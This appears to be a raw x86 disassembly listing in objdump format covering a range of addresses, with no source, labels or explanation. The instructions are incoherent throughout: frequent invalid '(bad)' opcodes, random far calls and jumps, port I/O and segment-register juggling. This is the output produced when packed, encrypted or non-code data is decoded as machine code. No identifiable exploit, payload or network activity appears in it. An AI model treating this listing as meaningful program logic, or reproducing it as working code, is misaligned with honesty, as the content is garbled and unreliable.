  421914:	mov    bl,BYTE PTR [edi-0x5b]
  421917:	loope  0x4218a9
  421919:	mov    al,ds:0x2d0f7936
  42191e:	pop    eax
  42191f:	xchg   esp,eax
  421920:	mov    al,0xad
  421922:	xchg   ebx,eax
  421923:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421925:	(bad)  
  421926:	jp     0x42195e
  421928:	mov    bl,0x80
  42192a:	fld    QWORD PTR [ecx+0x9f05f32]
  421930:	jae    0x4218f2
  421932:	push   edi
  421933:	adc    DWORD PTR [ebx],edi
  421935:	scas   al,BYTE PTR es:[edi]
  421936:	add    BYTE PTR [ebx],0x53
  421939:	push   ss
  42193a:	push   ecx
  42193b:	repz jnp 0x4218f0
  42193e:	pop    ds
  42193f:	lds    esp,FWORD PTR [eax-0x5f]
  421942:	loop   0x421914
  421944:	jl     0x42190a
  421946:	and    eax,0xc5494b05
  42194b:	in     al,dx
  42194c:	push   ebx
  42194d:	call   0xbc95:0x8556bbfe
  421954:	add    eax,0xe9256a7b
  421959:	add    ebp,DWORD PTR [eax-0x5d747ee0]
  42195f:	push   ecx
  421960:	fldcw  WORD PTR [eax-0x63]
  421963:	xor    al,0x3f
  421965:	(bad)  
  421966:	mov    ds:0x11036241,eax
  42196b:	sbb    eax,0xee0b0a20
  421970:	jb     0x42195c
  421972:	cmp    DWORD PTR [eax-0x1d],edi
  421975:	mov    eax,0xea191a22
  42197a:	out    dx,eax
  42197b:	loopne 0x42193a
  42197d:	xchg   edx,eax
  42197e:	push   ds
  42197f:	jno    0x42195e
  421981:	scas   eax,DWORD PTR es:[edi]
  421982:	push   esi
  421983:	js     0x4219ca
  421985:	push   es
  421986:	push   0xc20b00e6
  42198b:	ins    BYTE PTR es:[edi],dx
  42198c:	mov    cl,BYTE PTR [ebp-0x3]
  42198f:	push   0x70b0fa57
  421994:	adc    DWORD PTR ds:0x558d82b,ecx
  42199a:	ficom  DWORD PTR [ebx]
  42199c:	adc    esi,DWORD PTR ds:[eax-0x3b]
  4219a0:	cmp    edx,DWORD PTR [ecx]
  4219a2:	adc    cl,BYTE PTR [ebx-0x183e93fa]
  4219a8:	shr    DWORD PTR [esp+eax*8+0x62],1
  4219ac:	cmp    al,0x9
  4219ae:	jae    0x42199b
  4219b0:	enter  0x8300,0xc7
  4219b4:	dec    edi
  4219b5:	sub    DWORD PTR [ebx],ebp
  4219b7:	mov    dh,0x4c
  4219b9:	lods   al,BYTE PTR ds:[esi]
  4219ba:	jae    0x421994
  4219bc:	sub    eax,0xce2eb1ff
  4219c1:	sub    eax,0x16b54b69
  4219c6:	out    0x8d,al
  4219c8:	ins    BYTE PTR es:[edi],dx
  4219c9:	push   es
  4219ca:	sub    edi,DWORD PTR [esi-0x3f]
  4219cd:	jo     0x421962
  4219cf:	(bad)  
  4219d0:	fs push 0x79
  4219d3:	add    BYTE PTR [ecx-0x20],ch
  4219d6:	pop    eax
  4219d7:	mov    eax,ds:0xb035231e
  4219dc:	test   BYTE PTR cs:[ebx],ch
  4219df:	loope  0x421a0e
  4219e1:	mov    bl,0xdb
  4219e3:	fmul   DWORD PTR [esi+0x73]
  4219e6:	(bad)  
  4219e7:	lods   eax,DWORD PTR ds:[esi]
  4219e8:	jle    0x421a3c
  4219ea:	int    0xf9
  4219ec:	pop    eax
  4219ed:	push   0xe6d151f6
  4219f2:	pop    ebx
  4219f3:	into   
  4219f4:	sti    
  4219f5:	mov    esp,cs
  4219f7:	inc    eax
  4219f8:	and    BYTE PTR [esi+0x35],cl
  4219fb:	sub    al,0x7b
  4219fd:	inc    BYTE PTR [ebp-0x347df1a9]
  421a03:	pop    ds
  421a04:	push   ebp
  421a05:	js     0x421a66
  421a07:	rcl    BYTE PTR [edx],0x5f
  421a0a:	xchg   ebp,eax
  421a0b:	dec    edi
  421a0c:	(bad)  
  421a0d:	pop    ss
  421a0e:	jge    0x421993
  421a10:	imul   ecx,ebp,0xffffffad
  421a13:	sbb    BYTE PTR [ebx+0xf],0xf1
  421a17:	or     DWORD PTR [bx],ebx
  421a1a:	inc    edi
  421a1b:	adc    DWORD PTR [edi-0x73af9ad9],0xffffffd2
  421a22:	pop    edx
  421a23:	mov    ebp,0x35e63827
  421a28:	add    eax,DWORD PTR [esi+0x5d5ce1d3]
  421a2e:	pop    ebx
  421a2f:	fs mov al,0xb7
  421a32:	into   
  421a33:	sbb    eax,0xbfca369b
  421a38:	push   ebx
  421a39:	outs   dx,BYTE PTR ds:[esi]
  421a3a:	sub    al,0xb6
  421a3c:	sbb    esi,DWORD PTR [esi]
  421a3e:	call   0xda80:0xf7bb1752
  421a45:	xchg   BYTE PTR [esi-0x7d],ch
  421a48:	les    edx,FWORD PTR [esi+0x4e]
  421a4b:	mov    dl,0xe7
  421a4d:	(bad)  
  421a4f:	sar    BYTE PTR [ebx],1
  421a51:	inc    esi
  421a52:	out    dx,al
  421a53:	std    
  421a54:	xchg   al,cl
  421a56:	mov    edi,DWORD PTR [ebp+0x11]
  421a59:	pop    ss
  421a5a:	and    dh,0x9e
  421a5d:	mov    eax,0xef688357
  421a62:	add    al,0xfe
  421a64:	dec    eax
  421a65:	sbb    DWORD PTR [ebx-0x1dc68d92],0xffffff89
  421a6c:	test   ecx,ebx
  421a6e:	scas   eax,DWORD PTR es:[edi]
  421a6f:	sub    ah,dl
  421a71:	mov    edi,0xb92eaed
  421a76:	mov    esp,0x186e56d0
  421a7b:	or     dl,BYTE PTR [ecx]
  421a7d:	retf   
  421a7e:	sbb    DWORD PTR [bp+si],esp
  421a81:	pop    es
  421a82:	jae    0x421a26
  421a84:	stos   DWORD PTR es:[edi],eax
  421a85:	(bad)  
  421a86:	rcr    DWORD PTR [ebp+0x23f0e13b],cl
  421a8c:	push   cs
  421a8d:	cmp    DWORD PTR [ecx+0x1848be3],0x15e3bb95
  421a97:	sbb    eax,0xbf4cdea6
  421a9c:	stc    
  421a9d:	sbb    BYTE PTR [edi-0x1afd73e8],ah
  421aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aa4:	shl    bh,1
  421aa6:	scas   eax,DWORD PTR es:[edi]
  421aa7:	pop    es
  421aa8:	jb     0x421a5f
  421aaa:	and    al,0xf8
  421aac:	clc    
  421aad:	popa   
  421aae:	push   eax
  421aaf:	pop    ss
  421ab0:	jp     0x421ad7
  421ab2:	sub    BYTE PTR [esi-0x2c11c6fa],dh
  421ab8:	and    DWORD PTR es:[ebp+0x6f],0x5cf2aeed
  421ac0:	lods   al,BYTE PTR ds:[esi]
  421ac1:	cmp    eax,0x390a0950
  421ac6:	and    al,cl
  421ac8:	mov    dl,0x32
  421aca:	call   0x38ee9ef8
  421acf:	cmp    ah,al
  421ad1:	daa    
  421ad2:	adc    eax,0x36d85f45
  421ad7:	add    ah,dh
  421ad9:	aad    0x8e
  421adb:	jle    0x421aa4
  421add:	popa   
  421ade:	out    0x49,al
  421ae0:	test   BYTE PTR [eax+0x49],dh
  421ae3:	out    dx,eax
  421ae4:	sub    dh,BYTE PTR [edi+0x4ffda5af]
  421aea:	inc    esi
  421aeb:	pop    es
  421aec:	es test al,0xb5
  421aef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421af0:	enter  0x5e87,0x57
  421af4:	in     eax,0x3f
  421af6:	mov    eax,ds:0x8897f07e
  421afb:	and    dl,BYTE PTR [edi-0x29341b35]
  421b01:	enter  0xad76,0xa0
  421b05:	das    
  421b06:	icebp  
  421b07:	jns    0x421b1a
  421b09:	sbb    dh,BYTE PTR [edi]
  421b0b:	pusha  
  421b0c:	(bad)  
  421b0d:	and    DWORD PTR [esi-0x64],esi
  421b10:	add    ebx,DWORD PTR [eax+0x5e]
  421b13:	inc    esi
  421b14:	ins    BYTE PTR es:[edi],dx
  421b15:	jne    0x421b4d
  421b17:	std    
  421b18:	or     ebp,DWORD PTR [ebp+eax*2+0xdb9c601]
  421b1f:	out    dx,al
  421b20:	and    esi,DWORD PTR [ebp+0x64]
  421b23:	inc    ecx
  421b24:	xor    ah,bh
  421b26:	and    eax,DWORD PTR [esi+0x4d]
  421b29:	push   esp
  421b2a:	add    eax,0x7f32bc9b
  421b2f:	dec    eax
  421b30:	test   al,0x7c
  421b32:	sbb    esp,edx
  421b34:	test   BYTE PTR [edx-0xd],cl
  421b37:	mov    al,0x6f
  421b39:	pop    ebp
  421b3a:	push   ecx
  421b3b:	or     eax,0xe67dcf75
  421b40:	cld    
  421b41:	jno    0x421af3
  421b43:	test   eax,0xc0ce6ca0
  421b48:	icebp  
  421b49:	dec    edx
  421b4a:	inc    esp
  421b4b:	lods   eax,DWORD PTR ds:[esi]
  421b4c:	test   cl,bh
  421b4e:	inc    esi
  421b4f:	nop
  421b50:	(bad)  
  421b51:	fcomp  DWORD PTR [esp+eax*1+0x55]
  421b55:	fsubr  DWORD PTR [eax+0x35]
  421b58:	sub    edi,ecx
  421b5a:	add    al,0x2f
  421b5c:	push   es
  421b5d:	arpl   WORD PTR [esi],dx
  421b5f:	ins    BYTE PTR es:[edi],dx
  421b60:	sub    al,0x7b
  421b62:	pop    edi
  421b63:	fild   QWORD PTR [ebp-0x22f2dd45]
  421b69:	jle    0x421b7a
  421b6b:	jo     0x421b91
  421b6d:	mov    edi,esi
  421b6f:	dec    ebx
  421b70:	ja     0x421bd6
  421b72:	pop    ecx
  421b73:	pop    es
  421b74:	iret   
  421b75:	lds    edx,FWORD PTR [edx+eax*1+0x2f]
  421b79:	push   ss
  421b7a:	mov    eax,ds:0x8367eb8b
  421b7f:	cld    
  421b80:	pop    esp
  421b81:	rol    DWORD PTR [ebx+0x6b],cl
  421b84:	mov    bh,0x9e
  421b86:	leave  
  421b87:	pop    ecx
  421b88:	jns    0x421c04
  421b8a:	call   0x33ac:0xabdb8078
  421b91:	lahf   
  421b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b93:	sbb    dl,BYTE PTR [ebx-0x29]
  421b96:	mov    esi,0xfacfbbc5
  421b9b:	mov    esp,0x2745a141
  421ba0:	loopne 0x421b73
  421ba2:	stos   BYTE PTR es:[edi],al
  421ba3:	mov    eax,0x36835669
  421ba8:	xlat   BYTE PTR ds:[ebx]
  421ba9:	jmp    DWORD PTR [edx-0x40247790]
  421baf:	sti    
  421bb0:	dec    ebx
  421bb1:	push   ds
  421bb2:	xor    BYTE PTR [edx],al
  421bb4:	aas    
  421bb5:	cwde   
  421bb6:	hlt    
  421bb7:	add    dl,ah
  421bb9:	dec    edx
  421bba:	stos   DWORD PTR es:[edi],eax
  421bbb:	pushf  
  421bbc:	repnz sahf 
  421bbe:	lahf   
  421bbf:	js     0x421b99
  421bc1:	xchg   BYTE PTR [esi],dh
  421bc3:	mov    dh,0x4c
  421bc5:	dec    ebp
  421bc6:	pop    edi
  421bc7:	shr    BYTE PTR [edi-0x45],1
  421bca:	test   al,0x70
  421bcc:	jl     0x421b81
  421bce:	pusha  
  421bcf:	nop
  421bd0:	test   DWORD PTR [esi+0x79a98ace],edx
  421bd6:	xor    ebx,DWORD PTR [edi-0x4d5e065f]
  421bdc:	xor    DWORD PTR [edi-0x3ce2db0c],edi
  421be2:	in     eax,0x92
  421be4:	adc    eax,0x4a3fb4e5
  421be9:	or     ebp,ecx
  421beb:	dec    edi
  421bec:	jmp    0x421b89
  421bee:	or     BYTE PTR [edi+0x61],0x28
  421bf2:	js     0x421bd8
  421bf4:	mov    eax,0x8f9f757c
  421bf9:	pop    ss
  421bfa:	sub    eax,0x1d62f2eb
  421bff:	mov    al,dl
  421c01:	cli    
  421c02:	in     eax,dx
  421c03:	sub    BYTE PTR [ecx+0x3a],0x3f
  421c07:	push   ds
  421c08:	mov    ?,WORD PTR [edi]
  421c0a:	xchg   edx,eax
  421c0b:	ds ins DWORD PTR es:[edi],dx
  421c0d:	enter  0x1426,0x76
  421c11:	add    esp,ebx
  421c13:	sbb    eax,DWORD PTR [ebx-0xef45c58]
  421c19:	out    dx,eax
  421c1a:	adc    al,0x19
  421c1c:	push   0x7e
  421c1e:	mov    ds,WORD PTR [edi+0x30]
  421c21:	inc    esi
  421c22:	jno    0x421c38
  421c24:	mov    al,0x41
  421c26:	mov    ds:0x52a81b9c,eax
  421c2b:	dec    eax
  421c2c:	lahf   
  421c2d:	xchg   ebp,eax
  421c2e:	in     eax,0x85
  421c30:	add    BYTE PTR [esi-0x47],0x9b
  421c34:	lods   eax,DWORD PTR ds:[esi]
  421c35:	jle    0x421c98
  421c37:	xchg   edx,eax
  421c38:	test   al,0xf3
  421c3a:	cli    
  421c3b:	push   0x7583436e
  421c40:	je     0x421cc0
  421c42:	imul   edi,DWORD PTR [eax-0x5c392a13],0x75784924
  421c4c:	std    
  421c4d:	popf   
  421c4e:	dec    ebp
  421c4f:	imul   edi,esp,0x23
  421c52:	mov    bh,bl
  421c54:	or     ch,BYTE PTR [ebx]
  421c56:	scas   al,BYTE PTR es:[edi]
  421c57:	xor    al,0xf4
  421c59:	mov    ds:0xe77b299a,eax
  421c5e:	(bad)  
  421c5f:	inc    esi
  421c60:	pop    esi
  421c61:	lea    esi,[eax-0x76]
  421c64:	sbb    ch,BYTE PTR cs:[esi+0x4112fc8d]
  421c6b:	arpl   WORD PTR [ebx],si
  421c6d:	jbe    0x421cea
  421c6f:	clc    
  421c70:	dec    ebx
  421c71:	idiv   BYTE PTR es:[ebx-0x4f]
  421c75:	imul   ecx,DWORD PTR [esi+0x73241c70],0x3d6146a1
  421c7f:	push   es
  421c80:	pop    edi
  421c81:	mov    eax,ds:0xde703756
  421c86:	shr    BYTE PTR [ebp-0x1b],0x2f
  421c8a:	pop    edx
  421c8b:	pop    ecx
  421c8c:	jae    0x421ca1
  421c8e:	cwde   
  421c8f:	cmp    DWORD PTR [esi-0x151123b9],esi
  421c95:	(bad)  
  421c96:	pop    edx
  421c97:	mov    cl,0x46
  421c99:	fdiv   DWORD PTR [edi+eax*8-0x7efa59de]
  421ca0:	fdivr  DWORD PTR [esi+0x5f]
  421ca3:	xchg   edx,eax
  421ca4:	xor    BYTE PTR [ebx+0x4716b00b],dh
  421caa:	mov    edi,0xd1deae47
  421caf:	and    al,0x4a
  421cb1:	shl    BYTE PTR [edx+eiz*8],0x80
  421cb5:	js     0x421cb1
  421cb7:	xor    eax,0xd604b6
  421cbc:	fs mov esi,0x43fed069
  421cc2:	scas   al,BYTE PTR es:[edi]
  421cc3:	lahf   
  421cc4:	jae    0x421cc5
  421cc6:	jmp    DWORD PTR [esi+0x423fd4c6]
  421ccc:	lock clc 
  421cce:	push   ds
  421ccf:	ds ja  0x421d16
  421cd2:	pop    ebx
  421cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cd4:	jae    0x421ca6
  421cd6:	int    0xb5
  421cd8:	test   DWORD PTR [edx+0x5],0x3b96b963
  421cdf:	pop    ebp
  421ce0:	loopne 0x421c83
  421ce2:	je     0x421c96
  421ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ce5:	mov    ah,0x1a
  421ce7:	scas   al,BYTE PTR es:[edi]
  421ce8:	sti    
  421ce9:	ror    BYTE PTR [ecx],cl
  421ceb:	mov    ds:0x5d118855,eax
  421cf0:	repnz push ebp
  421cf2:	out    0x8d,al
  421cf4:	iret   
  421cf5:	aaa    
  421cf6:	fdivr  st,st(6)
  421cf8:	add    edi,DWORD PTR [ebx+0x411e03de]
  421cfe:	jno    0x421d14
  421d00:	push   ebp
  421d01:	fs pop ebp
  421d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d04:	or     DWORD PTR [edx-0x499a77b0],eax
  421d0a:	dec    eax
  421d0b:	je     0x421cd0
  421d0d:	aam    0xd1
  421d0f:	jle    0x421d03
  421d11:	mov    bl,dl
  421d13:	(bad)  
  421d14:	fdiv   DWORD PTR [ebp-0x276f4c0d]
  421d1a:	mov    dl,0x2c
  421d1c:	idiv   ebx
  421d1e:	je     0x421cc3
  421d20:	xchg   esi,eax
  421d21:	leave  
  421d22:	stos   BYTE PTR es:[edi],al
  421d23:	push   ebp
  421d24:	mov    dh,0xee
  421d26:	repnz push ebp
  421d28:	inc    edx
  421d29:	cli    
  421d2a:	jae    0x421cd4
  421d2c:	lea    esi,[esi+0x677871ae]
  421d32:	pop    es
  421d33:	repz das 
  421d35:	ins    BYTE PTR es:[edi],dx
  421d36:	fisttp QWORD PTR [ebx+0xf]
  421d39:	xor    DWORD PTR [ebx-0x5f],ecx
  421d3c:	(bad)  
  421d3d:	cmc    
  421d3e:	mov    WORD PTR [edi-0x3e317202],?
  421d44:	popa   
  421d45:	xor    BYTE PTR [esi-0x5075d978],0x71
  421d4c:	cwde   
  421d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d4e:	(bad)  
  421d4f:	pop    ecx
  421d50:	inc    esp
  421d51:	js     0x421dbc
  421d53:	xchg   esp,eax
  421d54:	scas   al,BYTE PTR es:[edi]
  421d55:	ss jl  0x421d77
  421d58:	xor    al,0x9d
  421d5a:	into   
  421d5b:	data16 mov WORD PTR ds:0x720479fb,fs
  421d62:	out    dx,al
  421d63:	jne    0x421da8
  421d65:	or     eax,0xa40cfc8f
  421d6a:	pop    esi
  421d6b:	fadd   st(0),st
  421d6d:	loopne 0x421d85
  421d6f:	pop    ebx
  421d70:	ins    DWORD PTR es:[edi],dx
  421d71:	dec    ebp
  421d72:	push   ebx
  421d73:	sub    DWORD PTR [ebp+0x38],esp
  421d76:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  421d78:	sahf   
  421d79:	ins    BYTE PTR es:[edi],dx
  421d7a:	pop    ebx
  421d7b:	aas    
  421d7c:	jmp    0xa2c3:0x182941cd
  421d83:	call   esi
  421d85:	loope  0x421d1a
  421d87:	or     ch,cl
  421d89:	mov    edx,0x1a5a3cf7
  421d8e:	mov    edx,0x68d2f758
  421d93:	push   ecx
  421d94:	push   0xf6d3ecd8
  421d99:	cmp    DWORD PTR [esi+0x27],eax
  421d9c:	inc    edx
  421d9d:	(bad)  
  421d9e:	test   eax,0xf5315361
  421da3:	and    dh,BYTE PTR [ebx-0x42e20574]
  421da9:	jns    0x421dda
  421dab:	nop
  421dac:	inc    edi
  421dad:	pop    ecx
  421dae:	sub    eax,DWORD PTR [edi]
  421db0:	or     BYTE PTR [edi-0x151872fb],0x17
  421db7:	lock pause 
  421dba:	call   DWORD PTR [ebp-0x36]
  421dbd:	inc    ecx
  421dbe:	inc    ecx
  421dbf:	cmp    ch,BYTE PTR [ecx+edi*4+0x17]
  421dc3:	and    esi,DWORD PTR [eax]
  421dc5:	sub    al,0x48
  421dc7:	add    al,BYTE PTR [eax+0x45456672]
  421dcd:	sbb    ebp,DWORD PTR ds:0x98a3565d
  421dd3:	das    
  421dd4:	out    0x1f,eax
  421dd6:	jmp    0x421dbe
  421dd8:	ss ins BYTE PTR es:[edi],dx
  421dda:	add    DWORD PTR [eax-0x14],esi
  421ddd:	mov    eax,ds:0x2e0106dc
  421de2:	cmc    
  421de3:	in     eax,dx
  421de4:	jg     0x421d93
  421de6:	cwde   
  421de7:	xor    ecx,DWORD PTR [ebx+edi*8-0x2f]
  421deb:	leave  
  421dec:	push   ebx
  421ded:	loope  0x421e08
  421def:	adc    DWORD PTR [ecx+0x40],ebx
  421df2:	xor    eax,0xa80c5528
  421df7:	mov    dh,0x93
  421df9:	add    al,0xbb
  421dfb:	cdq    
  421dfc:	mov    dh,0x0
  421dfe:	scas   al,BYTE PTR es:[edi]
  421dff:	enter  0x3d3d,0x45
  421e03:	ins    DWORD PTR es:[edi],dx
  421e04:	jns    0x421d95
  421e06:	stc    
  421e07:	xchg   ebp,eax
  421e08:	cmp    eax,0x61e05e95
  421e0d:	shl    ah,cl
  421e0f:	sub    DWORD PTR [edx+0x3a9dd35a],esi
  421e15:	stc    
  421e16:	cmp    ebp,edi
  421e18:	inc    ecx
  421e19:	ficom  DWORD PTR ds:0xd965c2f
  421e1f:	mov    esp,0xb21a44fd
  421e24:	pop    edx
  421e25:	dec    BYTE PTR [esi+0x2b]
  421e28:	adc    esp,ecx
  421e2a:	call   0x3adf:0x36c5eb86
  421e31:	jbe    0x421e03
  421e33:	out    0x8c,al
  421e35:	aam    0xab
  421e37:	mov    esi,ebx
  421e39:	xchg   esp,eax
  421e3a:	adc    DWORD PTR [edi],ebp
  421e3c:	xchg   BYTE PTR [ebx+0x32bb74b3],dh
  421e42:	adc    DWORD PTR [ecx-0x700bb873],ebx
  421e48:	or     edi,0xe4ae622a
  421e4e:	pop    ebp
  421e4f:	jae    0x421ddd
  421e51:	neg    BYTE PTR [ebx]
  421e53:	arpl   WORD PTR [ecx-0x77],ax
  421e56:	test   al,0x7c
  421e58:	out    0x82,eax
  421e5a:	rcr    DWORD PTR [ebp-0x64b7712e],1
  421e60:	push   ss
  421e61:	sbb    eax,0x39c80c81
  421e66:	and    DWORD PTR [edx+0x32],ebp
  421e69:	or     esp,DWORD PTR [edx-0x7d943456]
  421e6f:	adc    al,0x51
  421e71:	add    DWORD PTR [edi],esp
  421e73:	sahf   
  421e74:	dec    esp
  421e75:	aam    0x37
  421e77:	gs dec esp
  421e79:	xchg   esi,eax
  421e7a:	std    
  421e7b:	sahf   
  421e7c:	lock mov ebx,DWORD PTR [edx]
  421e7f:	mov    ch,BYTE PTR [edi]
  421e81:	mov    ebp,0x28879830
  421e86:	and    bh,BYTE PTR [ebp+edi*4+0x734f2447]
  421e8d:	aad    0x6d
  421e8f:	inc    ebx
  421e90:	mov    ss,WORD PTR [esi+0xea85a0]
	...
  421eaa:	push   esi
  421eab:	inc    ebx
  421eac:	pop    edx
  421ead:	pop    ecx
  421eae:	pop    edi
  421eaf:	pop    ecx
  421eb0:	push   edi
  421eb1:	dec    edi
  421eb2:	mov    fs,WORD PTR [ecx+0x3384e972]
  421eb8:	and    bh,BYTE PTR [esi+0x1ad15]
  421ebe:	rol    DWORD PTR [esi],cl
  421ec0:	add    BYTE PTR [eax],al
  421ec2:	xchg   DWORD PTR [ecx+0xe],ebp
  421ec5:	icebp  
  421ec6:	mov    ecx,0x424fe7a5
  421ecb:	jle    0x421ebb
  421ecd:	adc    DWORD PTR [ebp-0x40156394],edi
  421ed3:	in     eax,dx
  421ed4:	inc    ebp
  421ed5:	cmp    ch,BYTE PTR [esi+0x7d]
  421ed8:	sbb    eax,0xb1d6f73e
  421edd:	xchg   edx,eax
  421ede:	sub    eax,0x7bef28aa
  421ee3:	dec    eax
  421ee4:	jl     0x421f54
  421ee6:	out    dx,al
  421ee7:	jp     0x421e97
  421ee9:	adc    al,0xc6
  421eeb:	rol    DWORD PTR [eax-0x3d61872f],cl
  421ef1:	icebp  
  421ef2:	sub    BYTE PTR [ecx+0x1aad1d5d],dl
  421ef8:	and    al,0x0
  421efa:	jecxz  0x421f61
  421efc:	pop    ss
  421efd:	pusha  
  421efe:	lods   eax,DWORD PTR ds:[esi]
  421eff:	mov    ds:0x5379813b,al
  421f04:	(bad)  
  421f06:	mov    bl,0xb5
  421f08:	push   0x37
  421f0a:	cwde   
  421f0b:	cld    
  421f0c:	fs jne 0x421ece
  421f0f:	inc    esp
  421f10:	fsubp  st(4),st
  421f12:	push   0xfffffff6
  421f14:	(bad)  
  421f15:	cdq    
  421f16:	and    eax,DWORD PTR [ebx+edx*8]
  421f19:	fisttp QWORD PTR [eax+0xb]
  421f1c:	adc    ebx,DWORD PTR [esi-0x42]
  421f1f:	jmp    0x421ec3
  421f21:	add    eax,0xf4e1f168
  421f26:	(bad)  
  421f27:	neg    BYTE PTR [edi+0xea5d78a]
  421f2d:	imul   esi,ebp,0x5b
  421f30:	mov    ds:0xd899b9ab,eax
  421f35:	pop    edx
  421f36:	shr    DWORD PTR [edx],cl
  421f38:	add    ch,ah
  421f3a:	arpl   WORD PTR [eax],bx
  421f3c:	popf   
  421f3d:	pop    edi
  421f3e:	lahf   
  421f3f:	(bad)  
  421f40:	fiadd  DWORD PTR [edx+edx*2]
  421f43:	xchg   esp,eax
  421f44:	hlt    
  421f45:	call   0x527568c9
  421f4a:	lods   al,BYTE PTR ds:[esi]
  421f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f4c:	sbb    al,0x3e
  421f4e:	jns    0x421f01
  421f50:	sbb    eax,0x39c61b1d
  421f55:	lods   al,BYTE PTR ds:[esi]
  421f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f57:	add    ch,0xc2
  421f5a:	and    ecx,DWORD PTR [edi-0x52]
  421f5d:	push   ss
  421f5e:	aam    0x5c
  421f60:	ja     0x421ef1
  421f62:	jnp    0x421ef3
  421f64:	fwait
  421f65:	push   ss
  421f66:	mov    ebp,0x8e928a2f
  421f6b:	lahf   
  421f6c:	js     0x421fa1
  421f6e:	pop    edi
  421f6f:	popa   
  421f70:	jmp    DWORD PTR [ebx+ecx*1]
  421f73:	dec    edx
  421f74:	aaa    
  421f75:	aas    
  421f76:	add    DWORD PTR [ebx],0x9a9c24d4
  421f7c:	jle    0x421f9a
  421f7e:	mov    esp,DWORD PTR [esi-0x21]
  421f81:	stos   WORD PTR es:[edi],ax
  421f83:	leave  
  421f84:	mov    BYTE PTR [esi+0x3f8b9fec],0xdb
  421f8b:	scas   eax,DWORD PTR es:[edi]
  421f8c:	fistp  QWORD PTR [edi-0x68ce48b7]
  421f92:	mov    eax,0xdc3a3e8f
  421f97:	dec    esp
  421f98:	and    ebx,0xcca73244
  421f9e:	cmc    
  421f9f:	gs enter 0x6048,0x35
  421fa4:	fsubrp st(1),st
  421fa6:	scas   al,BYTE PTR es:[edi]
  421fa7:	fcomi  st,st(0)
  421fa9:	cmp    al,0x4b
  421fab:	inc    ebp
  421fac:	mov    ah,0x2
  421fae:	mov    dl,BYTE PTR [esp+eax*8-0x32]
  421fb2:	cmp    dl,BYTE PTR [eax+0x52]
  421fb5:	or     DWORD PTR [ebp-0x6b],edx
  421fb8:	cli    
  421fb9:	call   0x31bc:0x2414bca1
  421fc0:	fcmovbe st,st(1)
  421fc2:	ss mov eax,0xd091910a
  421fc8:	in     al,dx
  421fc9:	inc    ebp
  421fca:	and    al,0x5d
  421fcc:	jmp    0x421faa
  421fce:	inc    ecx
  421fcf:	aad    0x56
  421fd1:	inc    ebp
  421fd2:	and    ebx,DWORD PTR [edi-0xe]
  421fd5:	add    DWORD PTR [bp+0xc],ecx
  421fd9:	or     al,0x26
  421fdb:	adc    DWORD PTR [edx+0x19],edi
  421fde:	xchg   esi,eax
  421fdf:	cmp    al,0x8c
  421fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fe2:	aaa    
  421fe3:	mov    eax,0xdc688243
  421fe8:	ins    DWORD PTR es:[edi],dx
  421fe9:	and    esp,0x70
  421fec:	pop    es
  421fed:	adc    eax,0xfffd2be1
  421ff2:	mov    WORD PTR [ecx],?
  421ff4:	pusha  
  421ff5:	(bad)  
  421ff6:	(bad)  
  421ff7:	mov    bl,0x50
  421ff9:	rcl    BYTE PTR [eax],cl
  421ffb:	aad    0x9
  421ffd:	rol    edx,cl
  421fff:	jno    0x421f8d
  422001:	stos   DWORD PTR es:[edi],eax
  422002:	pop    esp
  422003:	jnp    0x42203e
  422005:	into   
  422006:	in     al,dx
  422007:	sub    eax,DWORD PTR [edi]
  422009:	jmp    0x84a4ee8b
  42200e:	pop    esp
  42200f:	push   esp
  422010:	je     0x421ffc
  422012:	mov    cl,0xd8
  422014:	repz enter 0xb1fb,0x55
  422019:	pushf  
  42201a:	dec    edi
  42201b:	mov    edi,0x301b75df
  422020:	imul   eax,DWORD PTR [esi],0xffffff8a
  422023:	outs   dx,DWORD PTR ds:[esi]
  422024:	ss pop eax
  422026:	jmp    0x2537180e
  42202b:	push   cs
  42202c:	les    esi,FWORD PTR [ecx+0x67585bc3]
  422032:	mov    bh,0x27
  422034:	repz xchg ebp,eax
  422036:	mov    ebx,0xfbdd50a
  42203b:	add    eax,0x32a8274b
  422040:	rcl    BYTE PTR [eax+0x1a],0x56
  422044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422045:	lods   al,BYTE PTR ds:[esi]
  422046:	or     DWORD PTR [ecx-0x79],edi
  422049:	popf   
  42204a:	and    ecx,DWORD PTR [edx-0x5ba6f570]
  422050:	mov    ebp,0xf50bbff5
  422055:	repz scas eax,DWORD PTR es:[edi]
  422057:	push   ebx
  422058:	pop    ecx
  422059:	std    
  42205a:	retf   0xabbd
  42205d:	and    al,BYTE PTR [ecx-0x66816dcd]
  422063:	add    DWORD PTR [ecx],ecx
  422065:	push   ebx
  422066:	pop    esp
  422067:	dec    esp
  422068:	push   edx
  422069:	mov    edi,0xfd97654e
  42206e:	adc    bh,BYTE PTR [ebx+0x34]
  422071:	push   0x47499cc7
  422076:	add    al,bh
  422078:	or     BYTE PTR [ebx+ecx*2+0x12],ah
  42207c:	xchg   esp,eax
  42207d:	mov    al,0x1b
  42207f:	sar    BYTE PTR [esi],1
  422081:	(bad)
  422084:	rcl    BYTE PTR [esi+0x44],1
  422087:	and    eax,0x2e9bbada
  42208c:	fcmovb st,st(3)
  42208e:	adc    al,BYTE PTR [ebp-0x47]
  422091:	jl     0x422029
  422093:	sub    al,0xda
  422096:	add    ah,dl
  422098:	hlt    
  422099:	(bad)  
  42209a:	mov    ds:0xf797acd3,eax
  42209f:	sbb    cl,dl
  4220a1:	das    
  4220a2:	and    BYTE PTR [edi+0x8a2169f],dh
  4220a8:	in     eax,0x3d
  4220aa:	or     edi,edx
  4220ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220ad:	push   ebx
  4220ae:	popf   
  4220af:	ds cmp al,0xc6
  4220b2:	clc    
  4220b3:	xor    al,0x82
